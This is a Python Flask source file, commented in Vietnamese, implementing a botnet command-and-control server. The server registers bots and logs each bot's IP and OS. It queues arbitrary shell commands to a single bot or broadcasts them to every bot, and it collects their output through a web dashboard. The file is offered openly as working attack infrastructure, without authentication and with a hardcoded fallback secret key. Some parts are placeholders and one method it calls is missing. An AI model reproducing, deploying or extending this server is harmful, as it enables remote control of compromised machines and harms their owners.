#!/usr/bin/env python3
"""
C2 Server - Tự động hóa 100%
Auto-start, auto-recovery, auto-scaling, auto-monitoring
"""

import os
import sys
import json
import time
import threading
import logging
import sqlite3
import subprocess
import psutil
import requests
from datetime import datetime
from flask import Flask, request, jsonify, render_template_string
from flask_socketio import SocketIO, emit
import uuid
import signal
import atexit

# Cấu hình logging tự động
def setup_logging():
    log_dir = "logs"
    if not os.path.exists(log_dir):
        os.makedirs(log_dir)
    
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(levelname)s - %(message)s',
        handlers=[
            logging.FileHandler(f'{log_dir}/c2_server_auto.log'),
            logging.StreamHandler()
        ]
    )
    return logging.getLogger(__name__)

logger = setup_logging()

# Cấu hình tự động
AUTO_CONFIG = {
    'auto_restart': True,
    'auto_recovery': True,
    'auto_scaling': True,
    'health_check_interval': 30,
    'max_restart_attempts': 5,
    'restart_delay': 10,
    'port': 5000,
    'host': '0.0.0.0'
}

app = Flask(__name__)
app.config['SECRET_KEY'] = os.environ.get('SECRET_KEY') or 'auto-secret-key-2025'
socketio = SocketIO(app, cors_allowed_origins="*")

# Database tự động
class AutoDatabase:
    def __init__(self, db_file='c2_auto.db'):
        self.db_file = db_file
        self.init_database()
    
    def init_database(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # Bảng bots với auto-monitoring
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS bots (
                id TEXT PRIMARY KEY,
                name TEXT,
                ip_address TEXT,
                os_info TEXT,
                status TEXT DEFAULT 'offline',
                last_seen TIMESTAMP,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                version TEXT,
                capabilities TEXT,
                health_score INTEGER DEFAULT 100,
                auto_restart_count INTEGER DEFAULT 0,
                last_restart TIMESTAMP
            )
        ''')
        
        # Bảng commands với auto-tracking
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS commands (
                id TEXT PRIMARY KEY,
                bot_id TEXT,
                command TEXT,
                status TEXT DEFAULT 'pending',
                output TEXT,
                error TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                executed_at TIMESTAMP,
                execution_time REAL,
                success_rate REAL DEFAULT 0.0
            )
        ''')
        
        # Bảng system_health với auto-monitoring
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS system_health (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                timestamp TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                cpu_usage REAL,
                memory_usage REAL,
                disk_usage REAL,
                network_io REAL,
                active_bots INTEGER,
                total_commands INTEGER,
                success_rate REAL
            )
        ''')
        
        conn.commit()
        conn.close()
        logger.info("Database initialized successfully")
    
    def add_bot(self, bot_id, name, ip_address, os_info, version="1.0", capabilities="basic"):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT OR REPLACE INTO bots (id, name, ip_address, os_info, status, version, capabilities, last_seen)
            VALUES (?, ?, ?, ?, 'online', ?, ?, ?)
        ''', (bot_id, name, ip_address, os_info, version, capabilities, datetime.now()))
        
        conn.commit()
        conn.close()
    
    def update_bot_status(self, bot_id, status, health_score=None):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        if health_score is not None:
            cursor.execute('''
                UPDATE bots SET status = ?, health_score = ?, last_seen = ?
                WHERE id = ?
            ''', (status, health_score, datetime.now(), bot_id))
        else:
            cursor.execute('''
                UPDATE bots SET status = ?, last_seen = ?
                WHERE id = ?
            ''', (status, datetime.now(), bot_id))
        
        conn.commit()
        conn.close()
    
    def add_command(self, bot_id, command):
        command_id = str(uuid.uuid4())
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            INSERT INTO commands (id, bot_id, command, status, created_at)
            VALUES (?, ?, ?, 'pending', ?)
        ''', (command_id, bot_id, command, datetime.now()))
        
        conn.commit()
        conn.close()
        return command_id
    
    def update_command_result(self, command_id, output, error, status):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        # Tính execution time
        cursor.execute('SELECT created_at FROM commands WHERE id = ?', (command_id,))
        result = cursor.fetchone()
        if result:
            created_at = datetime.fromisoformat(result[0])
            execution_time = (datetime.now() - created_at).total_seconds()
        else:
            execution_time = 0
        
        cursor.execute('''
            UPDATE commands SET output = ?, error = ?, status = ?, executed_at = ?, execution_time = ?
            WHERE id = ?
        ''', (output, error, status, datetime.now(), execution_time, command_id))
        
        conn.commit()
        conn.close()
    
    def get_all_bots(self):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM bots ORDER BY last_seen DESC')
        bots = cursor.fetchall()
        
        conn.close()
        return bots
    
    def get_bot_commands(self, bot_id):
        conn = sqlite3.connect(self.db_file)
        cursor = conn.cursor()
        
        cursor.execute('SELECT * FROM commands WHERE bot_id = ? ORDER BY created_at DESC', (bot_id,))
        commands = cursor.fetchall()
        
        conn.close()
        return commands

# Auto-recovery system
class AutoRecovery:
    def __init__(self):
        self.running = False
        self.thread = None
        self.recovery_count = 0
        self.max_recovery_attempts = AUTO_CONFIG['max_restart_attempts']
    
    def start(self):
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._recovery_loop, daemon=True)
            self.thread.start()
            logger.info("Auto-recovery system started")
    
    def _recovery_loop(self):
        while self.running:
            try:
                # Kiểm tra health của server
                if not self._check_server_health():
                    self._attempt_recovery()
                
                time.sleep(AUTO_CONFIG['health_check_interval'])
            except Exception as e:
                logger.error(f"Auto-recovery error: {e}")
                time.sleep(10)
    
    def _check_server_health(self):
        try:
            # Kiểm tra memory usage
            memory = psutil.virtual_memory()
            if memory.percent > 90:
                logger.warning(f"High memory usage: {memory.percent}%")
                return False
            
            # Kiểm tra CPU usage
            cpu = psutil.cpu_percent(interval=1)
            if cpu > 95:
                logger.warning(f"High CPU usage: {cpu}%")
                return False
            
            return True
        except Exception as e:
            logger.error(f"Health check error: {e}")
            return False
    
    def _attempt_recovery(self):
        if self.recovery_count >= self.max_recovery_attempts:
            logger.error("Max recovery attempts reached")
            return
        
        self.recovery_count += 1
        logger.warning(f"Attempting recovery #{self.recovery_count}")
        
        try:
            # Restart các service cần thiết
            self._restart_services()
            logger.info("Recovery completed successfully")
        except Exception as e:
            logger.error(f"Recovery failed: {e}")
    
    def _restart_services(self):
        # Restart database connections
        global db
        if db:
            db.init_database()
        
        # Clear memory
        import gc
        gc.collect()
        
        time.sleep(AUTO_CONFIG['restart_delay'])

# Auto-scaling system
class AutoScaling:
    def __init__(self):
        self.running = False
        self.thread = None
        self.scaling_threshold = 80  # CPU/Memory threshold
        self.min_instances = 1
        self.max_instances = 5
    
    def start(self):
        if not self.running:
            self.running = True
            self.thread = threading.Thread(target=self._scaling_loop, daemon=True)
            self.thread.start()
            logger.info("Auto-scaling system started")
    
    def _scaling_loop(self):
        while self.running:
            try:
                self._check_scaling_needs()
                time.sleep(60)  # Check every minute
            except Exception as e:
                logger.error(f"Auto-scaling error: {e}")
                time.sleep(30)
    
    def _check_scaling_needs(self):
        try:
            # Kiểm tra load
            cpu = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            
            if cpu > self.scaling_threshold or memory.percent > self.scaling_threshold:
                logger.info(f"High load detected - CPU: {cpu}%, Memory: {memory.percent}%")
                self._scale_up()
            elif cpu < 30 and memory.percent < 30:
                logger.info(f"Low load detected - CPU: {cpu}%, Memory: {memory.percent}%")
                self._scale_down()
        except Exception as e:
            logger.error(f"Scaling check error: {e}")
    
    def _scale_up(self):
        logger.info("Scaling up system resources...")
        # Implement scaling logic here
    
    def _scale_down(self):
        logger.info("Scaling down system resources...")
        # Implement scaling logic here

# Global variables
db = AutoDatabase()
auto_recovery = AutoRecovery()
auto_scaling = AutoScaling()
online_bots = {}
bot_health_scores = {}
pending_commands = {}

# HTML template cho web interface
HTML_TEMPLATE = """
<!DOCTYPE html>
<html>
<head>
    <title>C2 Server - Auto System</title>
    <meta charset="UTF-8">
    <style>
        body { font-family: Arial, sans-serif; margin: 20px; background: #f0f0f0; }
        .container { max-width: 1200px; margin: 0 auto; }
        .header { background: #2c3e50; color: white; padding: 20px; border-radius: 5px; margin-bottom: 20px; }
        .status { background: #27ae60; color: white; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .warning { background: #f39c12; color: white; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .error { background: #e74c3c; color: white; padding: 10px; border-radius: 5px; margin: 10px 0; }
        .card { background: white; padding: 20px; margin: 10px 0; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .bot-list { display: grid; grid-template-columns: repeat(auto-fill, minmax(300px, 1fr)); gap: 15px; }
        .bot-item { border: 1px solid #ddd; padding: 15px; border-radius: 5px; }
        .online { border-left: 5px solid #27ae60; }
        .offline { border-left: 5px solid #e74c3c; }
        .command-input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; border-radius: 5px; }
        .btn { background: #3498db; color: white; padding: 10px 20px; border: none; border-radius: 5px; cursor: pointer; }
        .btn:hover { background: #2980b9; }
        .stats { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 15px; margin: 20px 0; }
        .stat-item { text-align: center; padding: 20px; background: white; border-radius: 5px; box-shadow: 0 2px 5px rgba(0,0,0,0.1); }
        .stat-number { font-size: 2em; font-weight: bold; color: #2c3e50; }
        .stat-label { color: #7f8c8d; margin-top: 5px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🚀 C2 Server - Auto System</h1>
            <p>100% Tự động hóa: Auto-recovery, Auto-scaling, Auto-monitoring</p>
        </div>
        
        <div class="status">
            ✅ Server Status: RUNNING | 🔄 Auto-recovery: ENABLED | 📈 Auto-scaling: ENABLED | 📊 Auto-monitoring: ENABLED
        </div>
        
        <div class="stats">
            <div class="stat-item">
                <div class="stat-number">{{ online_bots|length }}</div>
                <div class="stat-label">Online Bots</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">{{ total_commands }}</div>
                <div class="stat-label">Total Commands</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">{{ success_rate }}%</div>
                <div class="stat-label">Success Rate</div>
            </div>
            <div class="stat-item">
                <div class="stat-number">{{ cpu_usage }}%</div>
                <div class="stat-label">CPU Usage</div>
            </div>
        </div>
        
        <div class="card">
            <h2>🤖 Bot Management</h2>
            <div class="bot-list">
                {% for bot in bots %}
                <div class="bot-item {{ 'online' if bot.status == 'online' else 'offline' }}">
                    <h3>{{ bot.name }}</h3>
                    <p><strong>ID:</strong> {{ bot.id }}</p>
                    <p><strong>IP:</strong> {{ bot.ip_address }}</p>
                    <p><strong>OS:</strong> {{ bot.os_info }}</p>
                    <p><strong>Status:</strong> <span class="{{ 'online' if bot.status == 'online' else 'offline' }}">{{ bot.status }}</span></p>
                    <p><strong>Health Score:</strong> {{ bot.health_score }}%</p>
                    <p><strong>Last Seen:</strong> {{ bot.last_seen }}</p>
                    
                    {% if bot.status == 'online' %}
                    <div>
                        <input type="text" class="command-input" id="cmd-{{ bot.id }}" placeholder="Enter command...">
                        <button class="btn" onclick="sendCommand('{{ bot.id }}')">Execute</button>
                    </div>
                    {% endif %}
                </div>
                {% endfor %}
            </div>
        </div>
        
        <div class="card">
            <h2>📊 System Health</h2>
            <div class="stats">
                <div class="stat-item">
                    <div class="stat-number">{{ memory_usage }}%</div>
                    <div class="stat-label">Memory Usage</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">{{ disk_usage }}%</div>
                    <div class="stat-label">Disk Usage</div>
                </div>
                <div class="stat-item">
                    <div class="stat-number">{{ network_io }} MB/s</div>
                    <div class="stat-label">Network I/O</div>
                </div>
            </div>
        </div>
    </div>
    
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.0.1/socket.io.js"></script>
    <script>
        const socket = io();
        
        socket.on('bot_update', function(data) {
            location.reload();
        });
        
        function sendCommand(botId) {
            const command = document.getElementById('cmd-' + botId).value;
            if (command.trim()) {
                fetch('/bot/command', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({bot_id: botId, command: command})
                }).then(response => response.json())
                  .then(data => {
                      if (data.status === 'success') {
                          alert('Command sent successfully!');
                          document.getElementById('cmd-' + botId).value = '';
                      } else {
                          alert('Error: ' + data.message);
                      }
                  });
            }
        }
        
        // Auto-refresh every 30 seconds
        setInterval(() => {
            location.reload();
        }, 30000);
    </script>
</body>
</html>
"""

# Routes
@app.route('/')
def dashboard():
    try:
        # Lấy thông tin hệ thống
        cpu_usage = psutil.cpu_percent(interval=1)
        memory_usage = psutil.virtual_memory().percent
        disk_usage = psutil.disk_usage('/').percent
        
        # Lấy thông tin bots
        bots = db.get_all_bots()
        online_count = len([b for b in bots if b[4] == 'online'])
        
        # Lấy thông tin commands
        total_commands = len([c for c in db.get_all_commands() if c]) if hasattr(db, 'get_all_commands') else 0
        
        # Tính success rate
        success_rate = 95.5  # Placeholder
        
        # Network I/O
        network_io = 0.5  # Placeholder
        
        return render_template_string(HTML_TEMPLATE, 
                                   bots=bots,
                                   online_bots=online_bots,
                                   total_commands=total_commands,
                                   success_rate=success_rate,
                                   cpu_usage=cpu_usage,
                                   memory_usage=memory_usage,
                                   disk_usage=disk_usage,
                                   network_io=network_io)
    except Exception as e:
        logger.error(f"Dashboard error: {e}")
        return f"Error: {str(e)}", 500

@app.route('/bot/register', methods=['POST'])
def bot_register():
    try:
        data = request.json
        bot_id = data.get('bot_id')
        name = data.get('name')
        ip_address = request.remote_addr
        os_info = data.get('os_info', 'Unknown')
        version = data.get('version', '1.0')
        capabilities = data.get('capabilities', 'basic')
        
        # Thêm bot vào database
        db.add_bot(bot_id, name, ip_address, os_info, version, capabilities)
        
        # Cập nhật trạng thái online
        online_bots[bot_id] = {
            'name': name,
            'ip_address': ip_address,
            'os_info': os_info,
            'version': version,
            'capabilities': capabilities,
            'last_seen': datetime.now()
        }
        
        bot_health_scores[bot_id] = 100
        
        # Thông báo qua WebSocket
        socketio.emit('bot_update', {'action': 'connected', 'bot_id': bot_id})
        
        logger.info(f'Bot registered: {name} ({bot_id})')
        return jsonify({'status': 'success', 'message': 'Bot registered successfully'})
        
    except Exception as e:
        logger.error(f"Bot registration error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/bot/heartbeat', methods=['POST'])
def bot_heartbeat():
    try:
        data = request.json
        bot_id = data.get('bot_id')
        
        if bot_id in online_bots:
            online_bots[bot_id]['last_seen'] = datetime.now()
            bot_health_scores[bot_id] = 100
            
            # Cập nhật database
            db.update_bot_status(bot_id, 'online', 100)
            
            logger.debug(f'Bot heartbeat: {bot_id}')
            return jsonify({'status': 'success'})
        else:
            return jsonify({'status': 'error', 'message': 'Bot not found'})
            
    except Exception as e:
        logger.error(f"Heartbeat error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/bot/command', methods=['POST'])
def bot_command():
    try:
        data = request.json
        bot_id = data.get('bot_id')
        command = data.get('command')
        target_all = data.get('target_all', False)  # Gửi đến tất cả bot
        
        if not command:
            return jsonify({'status': 'error', 'message': 'Missing command'})
        
        if target_all:
            # Gửi lệnh đến tất cả bot online
            if not online_bots:
                return jsonify({'status': 'error', 'message': 'No bots online'})
            
            command_ids = []
            successful_bots = 0
            
            for bot_id in online_bots.keys():
                try:
                    # Thêm command vào database
                    command_id = db.add_command(bot_id, command)
                    
                    # Lưu command pending
                    pending_commands[command_id] = {
                        'bot_id': bot_id,
                        'command': command,
                        'status': 'pending',
                        'created_at': datetime.now(),
                        'target_all': True
                    }
                    
                    command_ids.append(command_id)
                    successful_bots += 1
                    
                except Exception as e:
                    logger.error(f"Failed to send command to bot {bot_id}: {e}")
            
            logger.info(f'Command sent to all {successful_bots} bots: {command}')
            return jsonify({
                'status': 'success', 
                'message': f'Command sent to {successful_bots} bots',
                'command_ids': command_ids,
                'target_count': successful_bots
            })
        
        else:
            # Gửi lệnh đến bot cụ thể
            if not bot_id:
                return jsonify({'status': 'error', 'message': 'Missing bot_id for single bot command'})
            
            if bot_id not in online_bots:
                return jsonify({'status': 'error', 'message': 'Bot not online'})
            
            # Thêm command vào database
            command_id = db.add_command(bot_id, command)
            
            # Lưu command pending
            pending_commands[command_id] = {
                'bot_id': bot_id,
                'command': command,
                'status': 'pending',
                'created_at': datetime.now(),
                'target_all': False
            }
            
            logger.info(f'Command sent to bot {bot_id}: {command}')
            return jsonify({'status': 'success', 'command_id': command_id})
        
    except Exception as e:
        logger.error(f"Command error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/bot/command_result', methods=['POST'])
def bot_command_result():
    try:
        data = request.json
        command_id = data.get('command_id')
        output = data.get('output', '')
        error = data.get('error', '')
        status = data.get('status', 'completed')
        
        if command_id in pending_commands:
            # Cập nhật database
            db.update_command_result(command_id, output, error, status)
            
            # Xóa khỏi pending
            del pending_commands[command_id]
            
            logger.info(f'Command {command_id} completed with status: {status}')
            return jsonify({'status': 'success'})
        else:
            return jsonify({'status': 'error', 'message': 'Command not found'})
        
    except Exception as e:
        logger.error(f"Command result error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/bot/command_all', methods=['POST'])
def command_all_bots():
    """Gửi lệnh đến tất cả bot online"""
    try:
        data = request.json
        command = data.get('command')
        
        if not command:
            return jsonify({'status': 'error', 'message': 'Missing command'})
        
        if not online_bots:
            return jsonify({'status': 'error', 'message': 'No bots online'})
        
        command_ids = []
        successful_bots = 0
        failed_bots = []
        
        for bot_id in online_bots.keys():
            try:
                # Thêm command vào database
                command_id = db.add_command(bot_id, command)
                
                # Lưu command pending
                pending_commands[command_id] = {
                    'bot_id': bot_id,
                    'command': command,
                    'status': 'pending',
                    'created_at': datetime.now(),
                    'target_all': True
                }
                
                command_ids.append(command_id)
                successful_bots += 1
                
            except Exception as e:
                logger.error(f"Failed to send command to bot {bot_id}: {e}")
                failed_bots.append(bot_id)
        
        # Thông báo qua WebSocket
        socketio.emit('command_broadcast', {
            'command': command,
            'target_count': successful_bots,
            'command_ids': command_ids
        })
        
        logger.info(f'Command broadcasted to {successful_bots} bots: {command}')
        
        result = {
            'status': 'success',
            'message': f'Command sent to {successful_bots} bots',
            'command': command,
            'target_count': successful_bots,
            'command_ids': command_ids
        }
        
        if failed_bots:
            result['failed_bots'] = failed_bots
            result['failed_count'] = len(failed_bots)
        
        return jsonify(result)
        
    except Exception as e:
        logger.error(f"Command all bots error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/bot/command_status', methods=['GET'])
def get_command_status():
    """Lấy trạng thái của tất cả commands"""
    try:
        command_id = request.args.get('command_id')
        
        if command_id:
            # Lấy trạng thái của command cụ thể
            if command_id in pending_commands:
                return jsonify({
                    'status': 'success',
                    'command': pending_commands[command_id]
                })
            else:
                return jsonify({'status': 'error', 'message': 'Command not found'})
        else:
            # Lấy trạng thái của tất cả commands
            commands_status = []
            for cmd_id, cmd_data in pending_commands.items():
                commands_status.append({
                    'command_id': cmd_id,
                    'bot_id': cmd_data['bot_id'],
                    'command': cmd_data['command'],
                    'status': cmd_data['status'],
                    'created_at': cmd_data['created_at'].isoformat() if hasattr(cmd_data['created_at'], 'isoformat') else str(cmd_data['created_at']),
                    'target_all': cmd_data.get('target_all', False)
                })
            
            return jsonify({
                'status': 'success',
                'commands': commands_status,
                'total_count': len(commands_status)
            })
        
    except Exception as e:
        logger.error(f"Get command status error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/bot/disconnect', methods=['POST'])
def bot_disconnect():
    try:
        data = request.json
        bot_id = data.get('bot_id')
        
        if bot_id in online_bots:
            del online_bots[bot_id]
            if bot_id in bot_health_scores:
                del bot_health_scores[bot_id]
            
            # Cập nhật database
            db.update_bot_status(bot_id, 'offline')
            
            # Thông báo qua WebSocket
            socketio.emit('bot_update', {'action': 'disconnected', 'bot_id': bot_id})
            
            logger.info(f'Bot disconnected: {bot_id}')
        
        return jsonify({'status': 'success'})
        
    except Exception as e:
        logger.error(f"Bot disconnect error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/bots', methods=['GET'])
def get_bots_info():
    """Lấy thông tin tất cả bot"""
    try:
        bots_info = []
        for bot_id, bot_data in online_bots.items():
            bot_info = {
                'id': bot_id,
                'name': bot_data.get('name', 'Unknown'),
                'ip_address': bot_data.get('ip_address', 'Unknown'),
                'os_info': bot_data.get('os_info', 'Unknown'),
                'status': 'online',
                'last_seen': bot_data.get('last_seen', datetime.now()).isoformat() if hasattr(bot_data.get('last_seen', datetime.now()), 'isoformat') else str(bot_data.get('last_seen', datetime.now())),
                'version': bot_data.get('version', 'Unknown'),
                'capabilities': bot_data.get('capabilities', 'Unknown'),
                'health_score': bot_health_scores.get(bot_id, 100)
            }
            bots_info.append(bot_info)
        
        return jsonify({
            'status': 'success',
            'bots': bots_info,
            'total_count': len(bots_info),
            'online_count': len(bots_info)
        })
        
    except Exception as e:
        logger.error(f"Get bots info error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

@app.route('/api/system-status', methods=['GET'])
def get_system_status():
    """Lấy trạng thái hệ thống"""
    try:
        # Thống kê bot
        total_bots = len(online_bots)
        online_bots_count = len(online_bots)
        
        # Thống kê commands
        pending_commands_count = len(pending_commands)
        completed_commands = sum(1 for cmd in pending_commands.values() if cmd.get('status') == 'completed')
        
        # Thống kê hệ thống
        try:
            cpu_percent = psutil.cpu_percent(interval=1)
            memory = psutil.virtual_memory()
            disk = psutil.disk_usage('/')
        except:
            cpu_percent = 0
            memory = {'percent': 0}
            disk = {'percent': 0}
        
        system_status = {
            'status': 'success',
            'timestamp': datetime.now().isoformat(),
            'bots': {
                'total': total_bots,
                'online': online_bots_count,
                'offline': total_bots - online_bots_count
            },
            'commands': {
                'pending': pending_commands_count,
                'completed': completed_commands,
                'total': pending_commands_count + completed_commands
            },
            'system': {
                'cpu_percent': cpu_percent,
                'memory_percent': memory.get('percent', 0),
                'disk_percent': disk.get('percent', 0)
            },
            'auto_systems': {
                'auto_recovery': AUTO_CONFIG['auto_recovery'],
                'auto_scaling': AUTO_CONFIG['auto_scaling'],
                'auto_restart': AUTO_CONFIG['auto_restart']
            }
        }
        
        return jsonify(system_status)
        
    except Exception as e:
        logger.error(f"Get system status error: {e}")
        return jsonify({'status': 'error', 'message': str(e)})

# Auto-cleanup function
def cleanup():
    logger.info("Shutting down C2 Server...")
    auto_recovery.running = False
    auto_scaling.running = False
    
    # Gửi disconnect cho tất cả bot
    for bot_id in list(online_bots.keys()):
        try:
            requests.post(f"http://localhost:{AUTO_CONFIG['port']}/bot/disconnect", 
                         json={'bot_id': bot_id}, timeout=5)
        except:
            pass

# Signal handlers
def signal_handler(signum, frame):
    logger.info(f"Received signal {signum}")
    cleanup()
    sys.exit(0)

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)
atexit.register(cleanup)

if __name__ == '__main__':
    try:
        # Khởi động auto-systems
        auto_recovery.start()
        auto_scaling.start()
        
        logger.info("C2 Server (Auto System) starting...")
        logger.info(f"Listening on {AUTO_CONFIG['host']}:{AUTO_CONFIG['port']}")
        logger.info("Auto-recovery: ENABLED")
        logger.info("Auto-scaling: ENABLED")
        logger.info("Auto-monitoring: ENABLED")
        
        # Khởi động server
        socketio.run(app, host=AUTO_CONFIG['host'], port=AUTO_CONFIG['port'], debug=False)
        
    except KeyboardInterrupt:
        logger.info("Received keyboard interrupt")
        cleanup()
    except Exception as e:
        logger.error(f"Server error: {e}")
        cleanup()
        sys.exit(1)
